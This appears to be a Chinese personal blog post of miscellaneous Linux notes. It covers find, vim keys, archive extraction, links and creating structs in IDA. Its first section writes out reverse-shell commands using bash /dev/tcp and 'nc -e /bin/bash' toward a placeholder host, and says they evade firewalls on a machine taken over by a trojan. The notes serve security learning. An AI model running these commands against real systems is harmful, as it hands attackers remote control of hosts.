---
layout: post
title: 一些Linux下的杂乱知识点
category: system
date: 2023-8-21
---
主要是未分类的知识点。
<!-- more -->
[toc]


# 反弹shell

若要从主机`A`接收一个反弹的`shell`，首先在主机上监听某个端口：

```bash
nc -l 8080
```

通过在主机`B`上执行如下命令，即可使得主机`B`主动发起一个连接到主机`A`。

```bash
bash -i >& /dev/tcp/主机A的IP/主机A监听的端口 0>&1
# 或者nc -e /bin/bash 计算机A的IP 计算机A监听的端口
# 但某些版本的nc不支持-e参数
```

“反弹”`shell`的意思就是，这个`shell`是由主机`B`主动发起连接让主机`A`使用主机`B`的`shell`的，因此不会被防火墙等阻拦。若我们能通过木马等方式控制某台主机并执行一次命令，那么我们即可反弹一个`shell`。

# Linux查找文件

```bash
find /etc -name "php.ini"
```

# VIM操作

回到顶部

```bash
gg
```

删除当前以下所有

```bash
dG
```

查找内容

```bash
/ # 唤起查找，输入完成后回车
n # 前向查找
N # 反向查找
```

# vmware共享文件夹

我现在设置到了主机桌面的`vmware_share`

在`ubuntu`下是在`/mnt/hgfs/vmware_share`

# ubuntu解压缩

```bash
tar –xvf file.tar //解压 tar包

tar -xzvf file.tar.gz //解压tar.gz

tar -xjvf file.tar.bz2   //解压 tar.bz2

tar –xZvf file.tar.Z   //解压tar.Z

unrar e file.rar //解压rar

unzip file.zip //解压zip

总结：

  (1)、*.tar 用 tar –xvf 解压
  (2)、*.gz 用 gzip -d或者gunzip 解压
  (3)、*.tar.gz和*.tgz 用 tar –xzf 解压
  (4)、*.bz2 用 bzip2 -d或者用bunzip2 解压
  (5)、*.tar.bz2用tar –xjf 解压
  (6)、*.Z 用 uncompress 解压
  (7)、*.tar.Z 用tar –xZf 解压
  (8)、*.rar 用 unrar e解压
  (9)、*.zip 用 unzip 解压
```

# 软链接和硬链接

## 软链接

- 可以理解为一个“快捷方式”。
- 原始文件被删除后，软链接将“悬空”，指向不存在的文件。
- 软链接可以链接到目录。
- 软链接不会存储文件内容，而是仅存储原文件的路径。

## 硬链接

- 可以理解为同一个文件的不同名称。
- 原始文件被删除后，硬链接仍然可以访问该文件（你可以把硬链接和原始文件名同等地当作文件的两个名称）。
- 不能链接到目录

```bash
# 创建硬链接
ln source_file hard_link
# 创建软链接
ln -s source_file soft _link
```

# ida创建结构体

在逆向尤其是二进制程序分析时，我们常常会遇到一些结构体，结构体里面还会嵌套一些结构体。有的师傅喜欢人肉反编译，但是这里还是记录一下`ida`如何进行结构体的创建。这里分为两种，一种是`ida`自带的结构体创建和编写C语言代码创建。

**无论使用哪种方式创建了结构体，只需要在`ida`反编译的代码中选中结构体指针变量并右键，点击`conver to struct*`然后选中自己创建的结构体即可让ida应用这种结构体方式。**

## ida自带结构体创建

使用`shift+f9`打开结构体菜单，如图所示：![](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131305716.png)

此时按下键盘上的`insert`键，输入要创建的结构体名称，如图所示：

![image-20231113130817035](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131308083.png)

就可以完成空结构体的创建，如图所示：

![image-20231113130844706](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131308741.png)

现在我们将光标移动到`ends`的一行，按下键盘上的`d`键，即可添加一个结构体的成员变量：

![image-20231113130945752](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131309786.png)

鼠标移动到默认创建的名称`field_0`上按下键盘上的`n`键可以更改名称，而再次按下键盘上的`d`键可以更改变量的数据类型，如图所示就创建好了一个带有一个8字节大小的叫做`name`的成员变量的结构体：

![image-20231113131104436](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131311471.png)

## 编写C语言代码创建结构体

假如你觉得上面的方法过于复杂，或者结构体成员变量较多，那么你可以采取直接编写C语言代码的方式来创建结构体。在`ida`中按下`shift+f1`，如图所示：

![image-20231113131420860](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131314895.png)

我们按下键盘上的`insert`键，即可弹出输入结构体的C语言代码的输入框：

![image-20231113131532298](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131315342.png)

输入完成后按下`ok`即可完成结构体的创建。无论使用了哪种方式创建结构体，都可以在结构体指针上使用`convert to strcu*`来应用结构体。

## 效果演示

如图所示，应用结构体后即可使用结构体的方式在反编译后的代码中显示。

![image-20231113131752853](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/images/202311131317899.png)
